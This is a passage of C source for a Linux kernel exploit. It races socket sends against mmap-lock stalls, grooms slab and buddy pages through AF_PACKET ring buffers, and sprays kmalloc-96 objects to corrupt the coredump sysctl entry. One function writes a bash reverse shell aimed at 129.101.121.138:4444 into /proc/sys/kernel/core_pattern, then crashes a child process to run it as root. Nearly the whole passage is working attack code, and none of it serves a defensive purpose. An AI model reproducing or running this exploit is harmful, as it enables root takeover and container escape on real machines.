		len--;
	buf[len] = '\0';
	return 0;
}

static int read_process_wchan(pid_t pid, char *buf, size_t size)
{
	char path[128];
	ssize_t len;
	int fd;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	len = read(fd, buf, size - 1);
	close(fd);
	if (len <= 0)
		return -1;
	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r'))
		len--;
	buf[len] = '\0';
	return 0;
}

static int wait_process_mmap_blocked(pid_t pid,
				     struct stage2_proc_ctrl *ctrl,
				     char *wchan, size_t wchan_size)
{
	char last[128] = "";
	unsigned int i;

	for (i = 0; i < 10000; i++) {
		if (atomic_load_explicit(&ctrl->send_returned,
					 memory_order_acquire) ||
		    atomic_load_explicit(&ctrl->send_done, memory_order_acquire))
			return -1;
		if (read_process_wchan(pid, wchan, wchan_size) == 0) {
			if (strcmp(last, wchan) != 0) {
				printf("[*] stage2 pid %d wchan=%s\n", pid, wchan);
				snprintf(last, sizeof(last), "%s", wchan);
			}
			if (strstr(wchan, "lock_mm") || strstr(wchan, "rwsem"))
				return 0;
		}
		sleep_usec(100);
	}
	return -1;
}

static void wait_stage2_stall_started(struct stage2_proc_ctrl *ctrl,
				      size_t candidate)
{
	unsigned int i;

	for (i = 0; i < 10000; i++) {
		if (atomic_load_explicit(&ctrl->stall_started,
					 memory_order_acquire))
			return;
		sleep_usec(50);
	}
	fprintf(stderr, "[-] stage2 candidate %zu mmap writer did not start\n",
		candidate);
	_exit(1);
}

static int wait_thread_blocked(pid_t *tid, atomic_int *done,
			       char *wchan, size_t wchan_size)
{
	unsigned int i;

	for (i = 0; i < 5000; i++) {
		if (atomic_load_explicit(done, memory_order_acquire))
			return -1;
		if (*tid > 0 &&
		    read_wchan(*tid, wchan, wchan_size) == 0 &&
		    strcmp(wchan, "sock_alloc_send_pskb") == 0)
			return 0;
		sleep_usec(1000);
	}
	return -1;
}

static int wait_sender_blocked(struct stage2_ctx *ctx,
			       char *wchan, size_t wchan_size)
{
	unsigned int i;

	for (i = 0; i < 5000; i++) {
		if (atomic_load_explicit(&ctx->done, memory_order_acquire))
			return -1;
		if (atomic_load_explicit(&ctx->entered, memory_order_acquire) &&
		    ctx->tid > 0 &&
		    read_wchan(ctx->tid, wchan, wchan_size) == 0 &&
		    strcmp(wchan, "sock_alloc_send_pskb") == 0) {
			sleep_usec(1000);
			if (read_wchan(ctx->tid, wchan, wchan_size) == 0 &&
			    strcmp(wchan, "sock_alloc_send_pskb") == 0)
				return 0;
		}
		sleep_usec(1000);
	}
	return -1;
}

static int wait_sender_mmap_blocked(struct stage2_ctx *ctx,
				    char *wchan, size_t wchan_size)
{
	unsigned int i;

	for (i = 0; i < 10000; i++) {
		if (atomic_load_explicit(&ctx->done, memory_order_acquire))
			return -1;
		if (ctx->tid > 0 &&
		    read_wchan(ctx->tid, wchan, wchan_size) == 0 &&
		    (strstr(wchan, "lock_mm") || strstr(wchan, "rwsem")))
			return 0;
		sleep_usec(50);
	}
	return -1;
}

static int wait_pipe_hup(int fd, int timeout_ms)
{
	struct pollfd pfd = {
		.fd = fd,
		.events = POLLIN | POLLHUP,
	};
	int ret;

	do {
		ret = poll(&pfd, 1, timeout_ms);
	} while (ret < 0 && errno == EINTR);
	if (ret <= 0)
		return -1;
	return (pfd.revents & (POLLIN | POLLHUP)) ? 0 : -1;
}

static void wait_stage2_child_ready(pid_t pid, atomic_int *ready,
				    size_t candidate)
{
	int status;

	while (!atomic_load_explicit(ready, memory_order_acquire)) {
		pid_t ret = waitpid(pid, &status, WNOHANG);

		if (ret < 0)
			die("waitpid stage2 readiness");
		if (ret == pid) {
			if (WIFSIGNALED(status))
				fprintf(stderr,
					"[-] stage2 candidate %zu died from signal %d during setup\n",
					candidate, WTERMSIG(status));
			else
				fprintf(stderr,
					"[-] stage2 candidate %zu exited with status %d during setup\n",
					candidate, WEXITSTATUS(status));
			fail("stage2 child exited before readiness");
		}
		sleep_usec(1000);
	}
}

static void trigger_gc_once(void)
{
	int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);

	if (fd >= 0)
		close(fd);
}

static void *splice_staller(void *arg)
{
	struct splice_ctx *ctx = arg;

	pin_to_cpu(1);
	ctx->tid = (pid_t)syscall(SYS_gettid);
	atomic_store_explicit(&ctx->ready, 1, memory_order_release);
	ctx->ret = splice(ctx->pipe_read, NULL, ctx->sock, NULL,
			  KERNEL_PAGE_SIZE, 0);
	ctx->err = ctx->ret < 0 ? errno : 0;
	atomic_store_explicit(&ctx->done, 1, memory_order_release);
	return NULL;
}

static __attribute__((unused)) void *gc_close_worker(void *arg)
{
	struct gc_close_ctx *ctx = arg;
	unsigned int i;

	pin_to_cpu(ctx->cpu);
	if ((ctx->flush_gc || ctx->prime_gc) &&
	    syscall(SYS_setresuid, GC_TRIGGER_UID, 0, 0) != 0)
		die("setresuid GC fire");
	if (ctx->prime_gc) {
		for (i = 0; i < 32; i++)
			gc_flush_barrier(ctx->flush_sender,
					 ctx->flush_pass_fd);
	}
	atomic_store_explicit(&ctx->ready, 1, memory_order_release);
	futex_wait_zero(&ctx->go);
	while (ctx->wait_target &&
	       !atomic_load_explicit(ctx->wait_target, memory_order_acquire))
		__asm__ __volatile__("pause");
	for (i = 0; i < ctx->delay; i++)
		__asm__ __volatile__("nop");
	if (ctx->flush_gc) {
		if (ctx->monitor_sender)
			ctx->sender_before_gc = atomic_load_explicit(
				ctx->monitor_sender, memory_order_acquire);
		trigger_gc_once();
		if (ctx->monitor_sender)
			ctx->sender_after_gc = atomic_load_explicit(
				ctx->monitor_sender, memory_order_acquire);
		ctx->ret = 0;
	} else if (ctx->wake_target) {
		futex_set(ctx->wake_target);
		ctx->ret = 0;
	} else if (ctx->value)
		ctx->ret = setsockopt(ctx->fd, SOL_SOCKET, SO_SNDBUF,
				      &ctx->value, sizeof(ctx->value));
	else
		ctx->ret = close(ctx->fd);
	ctx->err = ctx->ret < 0 ? errno : 0;
	if (!ctx->wake_target && !ctx->value && ctx->ret == 0) {
		sched_yield();
		sleep_usec(1000);
	}
	ctx->fd = -1;
	atomic_store_explicit(&ctx->done, 1, memory_order_release);
	return NULL;
}

static void *stage2_sender(void *arg)
{
	struct stage2_ctx *ctx = arg;
	unsigned char *control;
	struct cmsghdr *cmsg;
	struct msghdr msg = {0};
	struct iovec iov = {
		.iov_base = ctx->fault_page,
		.iov_len = 1,
	};
	size_t control_len = CMSG_SPACE(sizeof(ctx->fds));

	pin_to_cpu(ctx->cpu);
	if (ctx->sched_idle) {
		struct sched_param param = {0};

		if (sched_setscheduler(0, SCHED_IDLE, &param) != 0)
			die("sched_setscheduler stage sender");
	}
	if (ctx->nice_value &&
	    setpriority(PRIO_PROCESS, 0, ctx->nice_value) != 0)
		die("setpriority stage sender");
	if (ctx->isolated_uid &&
	    syscall(SYS_setresuid, ctx->isolated_uid,
		    ctx->isolated_uid, ctx->isolated_uid) != 0)
		die("setresuid isolated stage1");
	ctx->tid = (pid_t)syscall(SYS_gettid);
	control = calloc(1, control_len);
	if (!control) {
		ctx->ret = -1;
		ctx->err = ENOMEM;
		atomic_store(&ctx->done, 1);
		return NULL;
	}
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = control_len;
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(ctx->fds));
	memcpy(CMSG_DATA(cmsg), ctx->fds, sizeof(ctx->fds));

	atomic_store_explicit(&ctx->ready, 1, memory_order_release);
	while (!atomic_load_explicit(&ctx->go, memory_order_acquire))
		sleep_usec(100);
	atomic_store_explicit(&ctx->entered, 1, memory_order_release);
	ctx->ret = sendmsg(ctx->sock, &msg, MSG_NOSIGNAL);
	ctx->err = ctx->ret < 0 ? errno : 0;
	atomic_store_explicit(&ctx->done, 1, memory_order_release);
	while (ctx->hold_after_send &&
	       !atomic_load_explicit(ctx->hold_after_send,
				     memory_order_acquire))
		__asm__ __volatile__("pause");
	free(control);
	return NULL;
}

static void *mm_write_lock_staller(void *arg)
{
	struct mm_stall_worker *worker = arg;
	struct mm_stall_ctx *ctx = worker->ctx;
	int round;

	if (worker->cpu >= 0)
		pin_to_cpu(worker->cpu);
	ctx->tid = (pid_t)syscall(SYS_gettid);
	futex_wait_zero(&ctx->go);
	for (round = 0; ; round++) {
		int prot = (round + worker->id) & 1 ?
			PROT_READ | PROT_WRITE : PROT_READ;

		ctx->ret = mprotect(ctx->area, ctx->length, prot);
		if (ctx->ret < 0) {
			ctx->err = errno;
			if (round == 0)
				atomic_fetch_add_explicit(
					&ctx->ready, 1, memory_order_release);
			break;
		}
		if (round == 0)
			atomic_fetch_add_explicit(
				&ctx->ready, 1, memory_order_release);
		if (round == 0 && ctx->external_run)
			futex_wait_zero(ctx->external_run);
		if (round == 0 && ctx->external_started)
			atomic_store_explicit(ctx->external_started, 1,
					      memory_order_release);
		if (ctx->external_stop &&
		    atomic_load_explicit(ctx->external_stop,
					 memory_order_acquire))
			break;
	}
	atomic_fetch_add_explicit(&ctx->done, 1, memory_order_release);
	return NULL;
}

static void prepare_mm_stall(struct mm_stall_ctx *ctx, size_t length)
{
	volatile unsigned char *area;
	void *mapping;
	size_t i;
	int fd;

	fd = syscall(SYS_memfd_create, "mmap-lock-stall", MFD_CLOEXEC);
	if (fd < 0)
		die("memfd_create mmap-lock stall");
	if (ftruncate(fd, MIB) != 0)
		die("ftruncate mmap-lock stall");

	area = mmap(NULL, length, PROT_NONE,
		    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (area == MAP_FAILED)
		die("mmap mmap-lock stall");
	for (i = 0; i < length; i += MIB) {
		mapping = mmap((void *)(area + i), MIB,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_FIXED | MAP_POPULATE, fd, 0);
		if (mapping != (void *)(area + i))
			die("mmap alias mmap-lock stall");
	}
	close(fd);

	ctx->area = (void *)area;
	ctx->length = length;
	atomic_init(&ctx->go, 0);
	atomic_init(&ctx->ready, 0);
	atomic_init(&ctx->done, 0);
	ctx->tid = 0;
	ctx->external_run = NULL;
	ctx->external_started = NULL;
	ctx->external_stop = NULL;
	ctx->ret = 0;
	ctx->err = 0;
}

/* V100 thread: overflow flush + drain + buddy exhaust */
#define V100_EXTRA_MAX 200
static int v100_extra_fds[64][V100_EXTRA_MAX];
static int v100_extra_cnt[64];

static void *v98_thread_fn(void *arg)
{
	struct {
		int cpu;
		int fd_start;
		int fd_count;
		int mov_start;
		int mov_count;
		volatile char *mov_base;
		int done_unmov;
		int done_mov;
		int phase;
		int done_flush;
	} *t = arg;
	struct tpacket_req req = {
		.tp_block_size = KERNEL_PAGE_SIZE,
		.tp_block_nr = 1,
		.tp_frame_size = KERNEL_PAGE_SIZE,
		.tp_frame_nr = 1,
	};
	int k;

	pin_to_cpu(t->cpu);

	/* Phase 1: overflow flush drain pcplist[RECL]
	   to buddy via pcplist overflow */
	{
		int rnd;
		for (rnd = 0; rnd < 3; rnd++) {
			int tmp_fds[200];
			int n = 0;
			for (k = 0; k < 200; k++) {
				int fd = socket(AF_PACKET,
					SOCK_DGRAM,
					htons(ETH_P_ALL));
				if (fd < 0) break;
				if (setsockopt(fd, SOL_PACKET,
				    PACKET_RX_RING,
				    &req, sizeof(req)) == 0)
					tmp_fds[n++] = fd;
				else
					close(fd);
			}
			for (k = 0; k < n; k++)
				close(tmp_fds[k]);
			t->done_flush += n;
		}
	}

	/* Phase 2: drain g_predrain_fds (pcplist + some buddy) */
	for (k = 0; k < t->fd_count; k++) {
		int fi = t->fd_start + k;
		setsockopt(g_predrain_fds[fi],
			SOL_PACKET, PACKET_RX_RING,
			&req, sizeof(req));
		t->done_unmov++;
	}

	/* Phase 3: massive buddy exhaust temp sockets.
	   Keep open to hold pages. When buddy[UNMOV]
	   exhausts, fallback steal from buddy[RECL]
	   grabs our target. */
	{
		int ci = t->cpu;
		int n = 0;
		if (ci < 64) {
			for (k = 0; k < V100_EXTRA_MAX; k++) {
				int fd = socket(AF_PACKET,
					SOCK_DGRAM,
					htons(ETH_P_ALL));
				if (fd < 0) break;
				if (setsockopt(fd, SOL_PACKET,
				    PACKET_RX_RING,
				    &req, sizeof(req)) == 0) {
					v100_extra_fds[ci][n] = fd;
					n++;
				} else {
					close(fd);
				}
			}
			v100_extra_cnt[ci] = n;
		}
	}

	/* MOV fault-in */
	if (t->mov_base != NULL &&
	    t->mov_base !=
	    (volatile char *)MAP_FAILED) {
		for (k = 0; k < t->mov_count; k++) {
			int idx = t->mov_start + k;
			(void)t->mov_base[
			  (size_t)idx * KERNEL_PAGE_SIZE];
			t->done_mov++;
		}
	}

	return NULL;
}

/* V138: force empty slab page out of SLUB into buddy.
   After V102 frees all objects on the target page, SLUB keeps it on its
   partial/empty list.  We churn kmalloc-96 to push nr_partial above
   min_partial (5), then trigger memory pressure so kswapd calls
   shrink_slab -> SLUB discards excess empty pages including ours. */
static int force_slab_page_to_buddy(int flags_fd, uint64_t pfn)
{
	uint64_t fl;
	int round, created;
	struct sockaddr_un caddr;

	fl = read_kpageflag_at(flags_fd, pfn);
	if (!(fl & (1ULL << KPF_SLAB)))
		return 0;

	for (round = 0; round < 5; round++) {
		int churn_fds[600];
		created = 0;
		memset(&caddr, 0, sizeof(caddr));
		caddr.sun_family = AF_UNIX;
		caddr.sun_path[0] = '\0';

		for (int i = 0; i < 600; i++) {
			churn_fds[i] = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
			if (churn_fds[i] < 0)
				break;
			/* abstract name: \0 + 69 bytes -> addr_len=72,
			   alloc = 8+72=80 (sizeof=8) or 12+72=84 (sizeof=12)
			    ->kmalloc-96 either way. */
			int nlen = snprintf(caddr.sun_path + 1, 69,
					    "v138_%d_%d_%u", round, i,
					    (unsigned)getpid());
			(void)nlen;
			socklen_t alen = (socklen_t)(
				__builtin_offsetof(struct sockaddr_un, sun_path)
				+ 1 + 69);
			if (bind(churn_fds[i], (struct sockaddr *)&caddr,
				 alen) == 0)
				created++;
		}

		/* close all -> free all kmalloc-96 objects -> pages become
		   empty -> SLUB discards if nr_partial > min_partial */
		for (int i = 0; i < 600 && churn_fds[i] >= 0; i++)
			close(churn_fds[i]);

		/* memory pressure: MAP_POPULATE kicks kswapd -> shrink_slab */
		{
			size_t psz = (size_t)(64 + round * 64) << 20;
			void *pp = mmap(NULL, psz, PROT_READ | PROT_WRITE,
					MAP_PRIVATE | MAP_ANONYMOUS |
					MAP_POPULATE, -1, 0);
			if (pp != MAP_FAILED) {
				usleep(200000);
				munmap(pp, psz);
			}
		}
		usleep(100000);

		fl = read_kpageflag_at(flags_fd, pfn);
		printf("[D] V138 round %d: %d churn, fl=0x%llx%s\n",
		       round, created, (unsigned long long)fl,
		       (fl & (1ULL << KPF_SLAB)) ? " SLAB" :
		       (fl & (1ULL << 26)) ? " PGTABLE" : " FREE");
		fflush(stdout);

		if (!(fl & (1ULL << KPF_SLAB)))
			return 0;
	}
	return -1;
}

/*тут был ком по работе v139*/

#define SLAB_SPRAY_COUNT 512

static int spray_vertex_slot_for_dirtymode(
	uint64_t kbase, int count, int *spray_fds)
{
	uint64_t coredump_base = kbase + g_off_coredump_sysctls;
	uint64_t entry_next = coredump_base + 64 + 8;
	uint64_t entry_prev = coredump_base + 64;
	uint64_t fake_index = 0;
	struct sockaddr_un addr;
	int created = 0;
	int i;

	printf("[+] V139 spray targets: next=%#llx prev=%#llx\n",
	       (unsigned long long)entry_next,
	       (unsigned long long)entry_prev);
	printf("[+] V139 bilateral write destinations:\n"
	       "    W1: *(%#llx) = %#llx  [maxlen+mode]\n"
	       "    W2: *(%#llx) = %#llx  [procname]\n",
	       (unsigned long long)(entry_next + 8),
	       (unsigned long long)entry_prev,
	       (unsigned long long)entry_prev,
	       (unsigned long long)entry_next);
	printf("[+] V139 predicted mode = 0x%04x (S_IWOTH=%s)\n",
	       (unsigned)((entry_prev >> 32) & 0xFFFF),
	       ((entry_prev >> 32) & 0x2) ? "YES" : "NO");
	fflush(stdout);

	for (i = 0; i < count; i++) {
		spray_fds[i] = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
		if (spray_fds[i] < 0) break;

		memset(&addr, 0, sizeof(addr));
		addr.sun_family = AF_UNIX;
		addr.sun_path[0] = '\0';
		snprintf(addr.sun_path + 1, 5, "%04x", (unsigned)i);
		memcpy(&addr.sun_path[6],  &entry_next, 8);
		memcpy(&addr.sun_path[14], &entry_prev, 8);
		memcpy(&addr.sun_path[46], &fake_index, 8);

		socklen_t alen = (socklen_t)(
			__builtin_offsetof(struct sockaddr_un, sun_path) + 70);

		if (bind(spray_fds[i], (struct sockaddr *)&addr, alen) != 0) {
			close(spray_fds[i]);
			spray_fds[i] = -1;
			break;
		}
		created++;
	}

	printf("[+] V139: sprayed %d/%d sockets (kmalloc-96)\n",
	       created, count);
	fflush(stdout);
	return created;
}

static void trigger_core_pattern_escape(uint64_t kbase)
{
	struct stat st;
	struct rlimit rl;
	int fd;
	pid_t child;
	int status;

	(void)kbase;

	if (stat("/proc/sys/kernel/core_pattern", &st) == 0)
		printf("[O] V139 core_pattern mode=%#o (S_IWOTH=%s)\n",
		       st.st_mode & 07777,
		       (st.st_mode & S_IWOTH) ? "YES" : "NO");

	fd = open("/proc/sys/kernel/core_pattern", O_WRONLY);
	if (fd < 0) {
		printf("[-] V139: open(O_WRONLY) failed: %s (errno=%d)\n",
		       strerror(errno), errno);
		printf("[-] V139: /proc/sys may be read-only mounted\n");
		fflush(stdout);
		return;
	}

	static const char pipe_cmd[] =
		"|/bin/bash -c "
		"/bin/bash</dev/tcp/129.101.121.138/4444>&0";
	ssize_t w = write(fd, pipe_cmd, sizeof(pipe_cmd) - 1);
	close(fd);

	if (w < 0) {
		printf("[-] V139: write failed: %s\n", strerror(errno));
		fflush(stdout);
		return;
	}
	printf("[+] V139: core_pattern set (%zd bytes)\n", w);
	fflush(stdout);

	rl.rlim_cur = 1024 * 1024;
	rl.rlim_max = 1024 * 1024;
	setrlimit(RLIMIT_CORE, &rl);

	child = fork();
	if (child == 0) {
		rl.rlim_cur = 1024 * 1024;
		rl.rlim_max = 1024 * 1024;
		setrlimit(RLIMIT_CORE, &rl);
		abort();
		_exit(99);
	}
	if (child > 0) {
		waitpid(child, &status, 0);
		printf("[+] V139: coredump child exit status=%d\n", status);
		fflush(stdout);
		sleep_usec(500000);
		escape_succeeded = 1;
	} else {
		printf("[-] V139: fork failed: %s\n", strerror(errno));
		fflush(stdout);
	}
}

static int force_vertex_slab_release(
	uint64_t pfn, int passed_fd,
	int prepared_senders[VERTEX_SHEAF_DRAIN_SENDERS],
	int prepared_peers[VERTEX_SHEAF_DRAIN_SENDERS])
{
	unsigned int pass;
	int flags_fd;

	flags_fd = open("/proc/kpageflags", O_RDONLY | O_CLOEXEC);
	if (flags_fd < 0)
		die("open /proc/kpageflags");
	/* V104: immediate burst reclaim — page may already be FREE
	   after V102 cleanup.  Try PACKET_RX_RING on each CPU before
	   the vertex drain loop allocates anything that could steal it. */
	{
		uint64_t fl_entry = read_kpageflag_at(flags_fd, pfn);
		if (!(fl_entry & (1ULL << KPF_SLAB))) {
			int burst_ncpus = g_predrain_ncpus;
			int burst_pm = open("/proc/self/pagemap",
					    O_RDONLY | O_CLOEXEC);
			int bc;
			struct tpacket_req breq = {
				KERNEL_PAGE_SIZE, 1,
				KERNEL_PAGE_SIZE, 1,
			};
			printf("[D] V104 burst: pfn=%#llx fl=0x%llx"
			       " trying %d CPUs\n",
			       (unsigned long long)pfn,
			       (unsigned long long)fl_entry,
			       burst_ncpus);
			fflush(stdout);
			for (bc = 0; bc < burst_ncpus; bc++) {
				int bi = g_predrain_count;
				if (bi >= g_predrain_max) break;
				pin_to_cpu(bc);
				if (setsockopt(g_predrain_fds[bi],
				    SOL_PACKET, PACKET_RX_RING,
				    &breq, sizeof(breq)) != 0) {
					g_predrain_count = bi + 1;
					continue;
				}
				{
				void *bm = mmap(NULL, KERNEL_PAGE_SIZE,
					PROT_READ | PROT_WRITE,
					MAP_SHARED,
					g_predrain_fds[bi], 0);
				if (bm != MAP_FAILED) {
					(void)*(volatile char *)bm;
					if (burst_pm >= 0) {
						uint64_t ent;
						uint64_t pidx =
						  (uintptr_t)bm /
						  KERNEL_PAGE_SIZE;
						if (pread(burst_pm, &ent,
						    sizeof(ent),
						    (off_t)(pidx *
						    sizeof(ent)))
						    == (ssize_t)sizeof(ent)
						    && (ent &
						    ((1ULL<<55)-1))
						    == pfn) {
							g_movable_winner =
							  (volatile
							  unsigned char *)
							  (uintptr_t)bm;
							g_movable_winner_found
							  = 1;
							printf("[+] V104"
							  " BURST HIT"
							  " cpu=%d\n",
							  bc);
							fflush(stdout);
							g_predrain_count =
							  bi + 1;
							close(burst_pm);
							close(flags_fd);
							return 0;
						}
					}
					g_predrain_mappings[bi] = bm;
				}
				}
				g_predrain_count = bi + 1;
			}
			if (burst_pm >= 0) close(burst_pm);
		}
	}
	/* V148: slab churn — cycle kmalloc-96 partial list on CPU 0
	   to force SLUB to return the empty target page to buddy.
	   After V102, the page may have 0 active objects but SLUB
	   keeps it because nr_partial < min_partial.  Creating and
	   destroying many vertices increases nr_partial above the
	   threshold so __slab_free returns all-free pages. */
	{
		uint64_t fl_churn = read_kpageflag_at(flags_fd, pfn);
		if (fl_churn & (1ULL << KPF_SLAB)) {
			int sc_round;
			pin_to_cpu(0);
			for (sc_round = 0; sc_round < 5; sc_round++) {
				int churn_pairs[500][2];
				int cp, cp_ok = 0;
				for (cp = 0; cp < 500; cp++) {
					if (socketpair(AF_UNIX,
					    SOCK_DGRAM | SOCK_CLOEXEC,
					    0, churn_pairs[cp]) != 0)
						break;
					cp_ok++;
				}
				for (cp = 0; cp < cp_ok; cp++) {
					close(churn_pairs[cp][0]);
					close(churn_pairs[cp][1]);
				}
				trigger_gc_once();
				usleep(10000);
				fl_churn = read_kpageflag_at(flags_fd, pfn);
				printf("[D] V148 churn round %d:"
				       " %d pairs fl=0x%llx%s\n",
				       sc_round, cp_ok,
				       (unsigned long long)fl_churn,
				       (fl_churn & (1ULL << KPF_SLAB)) ?
				       " SLAB" : " FREE");
				fflush(stdout);
				if (!(fl_churn & (1ULL << KPF_SLAB)))
					break;
			}
			if (!(fl_churn & (1ULL << KPF_SLAB))) {
				int burst_ncpus2 = g_predrain_ncpus;
				int burst_pm2 = open("/proc/self/pagemap",
						     O_RDONLY | O_CLOEXEC);
				int bc2;
				struct tpacket_req breq2 = {
					KERNEL_PAGE_SIZE, 1,
					KERNEL_PAGE_SIZE, 1,
				};
				printf("[+] V148: page FREE, burst "
				       "capture %d CPUs\n",
				       burst_ncpus2);
				fflush(stdout);
				for (bc2 = 0; bc2 < burst_ncpus2; bc2++) {
					int bi2 = g_predrain_count;
					if (bi2 >= g_predrain_max) break;
					pin_to_cpu(bc2);
					if (setsockopt(g_predrain_fds[bi2],
					    SOL_PACKET, PACKET_RX_RING,
					    &breq2, sizeof(breq2)) != 0) {
						g_predrain_count = bi2 + 1;
						continue;
					}
					{
					void *bm2 = mmap(NULL,
						KERNEL_PAGE_SIZE,
						PROT_READ | PROT_WRITE,
						MAP_SHARED,
						g_predrain_fds[bi2], 0);
					if (bm2 != MAP_FAILED) {
						(void)*(volatile char *)bm2;
						if (burst_pm2 >= 0) {
							uint64_t ent2;
							uint64_t pidx2 =
							  (uintptr_t)bm2 /
							  KERNEL_PAGE_SIZE;
							if (pread(burst_pm2,
							    &ent2,
							    sizeof(ent2),
							    (off_t)(pidx2 *
							    sizeof(ent2)))
							    == (ssize_t)
							    sizeof(ent2)
							    && (ent2 &
							    ((1ULL<<55)-1))
							    == pfn) {
								g_movable_winner
								  = (volatile
								  unsigned char *)
								  (uintptr_t)bm2;
								g_movable_winner_found
								  = 1;
								printf("[+] V148"
								  " BURST HIT"
								  " cpu=%d\n",
								  bc2);
								fflush(stdout);
								g_predrain_count
								  = bi2 + 1;
								close(burst_pm2);
								close(flags_fd);
								return 0;
							}
						}
						g_predrain_mappings[bi2] =
							bm2;
					}
					}
					g_predrain_count = bi2 + 1;
				}
				if (burst_pm2 >= 0) close(burst_pm2);
			}
		}
	}
	for (pass = 0; pass < VERTEX_SHEAF_DRAIN_PASSES; pass++) {
		struct mm_stall_ctx stall = {0};
		struct stage2_ctx senders[VERTEX_SHEAF_DRAIN_SENDERS];
		pthread_t sender_threads[VERTEX_SHEAF_DRAIN_SENDERS];
		unsigned char *fault_pages;
		size_t sender;
		size_t fd_index;

		fault_pages = calloc(VERTEX_SHEAF_DRAIN_SENDERS,
				     KERNEL_PAGE_SIZE);
		if (!fault_pages)
			die("calloc drain fault_pages");
		for (sender = 0; sender < VERTEX_SHEAF_DRAIN_SENDERS;
		     sender++)
			((volatile char *)fault_pages)
				[sender * KERNEL_PAGE_SIZE] = 1;
		prepare_mm_stall(&stall, mm_stall_length);

		memset(senders, 0, sizeof(senders));
		for (sender = 0; sender < ARRAY_SIZE(senders); sender++) {
			struct stage2_ctx *ctx = &senders[sender];

			ctx->sock = prepared_senders[sender];
			for (fd_index = 0; fd_index < ARRAY_SIZE(ctx->fds);
			     fd_index++)
				ctx->fds[fd_index] = passed_fd;
			ctx->cpu = 1 - (int)(pass & 1);
			ctx->isolated_uid = 60000U +
				(uid_t)(((unsigned int)getpid() * 32 +
					 pass * ARRAY_SIZE(senders) + sender) %
					5000);
			ctx->fault_page =
				fault_pages + sender * KERNEL_PAGE_SIZE;
			atomic_init(&ctx->ready, 0);
			atomic_init(&ctx->go, 0);
			atomic_init(&ctx->entered, 0);
			atomic_init(&ctx->done, 0);
			if (pthread_create(&sender_threads[sender], NULL,
					   stage2_sender, ctx) != 0)
				die("pthread_create private vertex drain");
		}
		for (sender = 0; sender < ARRAY_SIZE(senders); sender++) {
			while (!atomic_load_explicit(&senders[sender].ready,
						     memory_order_acquire))
				sched_yield();
			atomic_store_explicit(&senders[sender].go, 1,
					      memory_order_release);
		}
		printf("[+] pc-hijack: senders launched (no staging staller)\n");
		for (sender = 0; sender < ARRAY_SIZE(senders); sender++) {
			if (pthread_join(sender_threads[sender], NULL) != 0)
				die("pthread_join private vertex drain");
			if (senders[sender].ret < 0) {
				errno = senders[sender].err;
				die("private vertex drain sendmsg");
			}
		}
			/* V126: UNMOVABLE setsockopt capture — batch PFN check.
			   Threads do ONLY setsockopt in tight loop (~1ms/call,
			   ~1000/s/thread, ~12K/s total). No per-alloc mmap/pagemap
			   eliminates mmap_write_lock contention (V124: 58/s/thr).
			   Batch PFN check after all threads join. */
			{
				int ncpus125 = g_predrain_ncpus;
				volatile int go125 = 0, stop125 = 0;
				struct fast_capture_arg fa125[64];
				pthread_t ft125[64];
				int t125, launched125 = 0;
				/* FIX B2: with block_nr=1, each ring is
				   1 page (was 64).  Raise fd budget so
				   total pages drained stays high:
				   12 CPUs × 16384 × 1 = 196K pages. */
				int fds_per_thr = 16384;

				if (ncpus125 > 64) ncpus125 = 64;

				printf("[D] V126 ENTER: cpus=%d fds/thr=%d pfn=0x%llx\n",
					ncpus125, fds_per_thr,
					(unsigned long long)pfn);
				fflush(stdout);

				{
					uint64_t fl_pre = read_kpageflag_at(
						flags_fd, pfn);
					if (fl_pre & (1ULL << 26)) {
						printf("[D] V129: PFN already PGTABLE,"
						       " skip capture\n");
						fflush(stdout);
						close(flags_fd);
						return -1;
					}
				}

				{
				volatile int ready125 = 0;
				for (t125 = 0; t125 < ncpus125; t125++) {
					int *thr_fds = calloc(fds_per_thr,
							      sizeof(int));
					if (!thr_fds) continue;
					fa125[t125].cpu = t125;
					fa125[t125].go = &go125;
					fa125[t125].stop = &stop125;
					fa125[t125].found = NULL;
					fa125[t125].fds = thr_fds;
					fa125[t125].fd_count = fds_per_thr;
					fa125[t125].idx = 0;
					fa125[t125].pagemap_fd = -1;
					fa125[t125].target_pfn = 0;
					fa125[t125].captured_map = NULL;
					fa125[t125].captured_fd_idx = -1;
					fa125[t125].create_socks = 1;
					fa125[t125].created_ok = 0;
					fa125[t125].ready_cnt = &ready125;
					if (pthread_create(&ft125[t125], NULL,
						fast_capture_fn,
						&fa125[t125]) == 0)
						launched125++;
				}
				while (__atomic_load_n(&ready125,
					__ATOMIC_ACQUIRE) < launched125)
					sched_yield();
				{
				int total_ok = 0;
				for (t125 = 0; t125 < launched125; t125++) {
					printf("[D] V126 cpu%d: ok=%d\n",
						fa125[t125].cpu,
						fa125[t125].created_ok);
					total_ok += fa125[t125].created_ok;
				}
				printf("[D] V126: total=%d launched=%d\n",
					total_ok, launched125);
				fflush(stdout);
				}
				}

				/* V143: mmap_write_lock barrage — hold
				   write lock during capture window so
				   ALL page faults (PGTABLE allocs) in
				   this process are blocked. setsockopt
				   is kernel-internal, unaffected. */
				struct mm_stall_ctx v143s = {0};
				struct mm_stall_worker v143w = {
					.ctx = &v143s, .cpu = 1, .id = 0,
				};
				pthread_t v143t;
				atomic_int v143r, v143d, v143x;

				v143s.area = stall.area;
				v143s.length = stall.length;
				atomic_init(&v143s.go, 0);
				atomic_init(&v143s.ready, 0);
				atomic_init(&v143s.done, 0);
				v143s.tid = 0;
				atomic_init(&v143r, 0);
				atomic_init(&v143d, 0);
				atomic_init(&v143x, 0);
				v143s.external_run = &v143r;
				v143s.external_started = &v143d;
				v143s.external_stop = &v143x;
				if (pthread_create(&v143t, NULL,
					mm_write_lock_staller,
					&v143w) != 0)
					die("V143 barrage thread");
				futex_set(&v143s.go);
				while (!atomic_load_explicit(
					&v143s.ready,
